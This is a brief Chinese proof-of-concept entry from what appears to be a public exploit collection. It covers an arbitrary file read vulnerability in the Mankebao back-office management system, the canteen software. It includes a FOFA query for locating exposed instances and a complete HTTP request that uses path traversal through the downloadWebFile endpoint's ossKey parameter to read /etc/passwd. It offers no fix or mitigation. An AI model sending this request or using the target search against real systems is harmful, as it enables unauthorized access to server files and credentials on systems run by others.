# 满客宝后台管理系统downloadWebFile任意文件读取漏洞

# 一、漏洞简介
满客宝后台管理系统downloadWebFile任意文件读取漏洞

# 二、影响版本
+ 满客宝智慧食堂

# 三、资产测绘
+ fofa`body="满客宝后台管理系统"`
+ 特征


# 四、漏洞复现
```java
GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/brcqc05pkowbygvw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
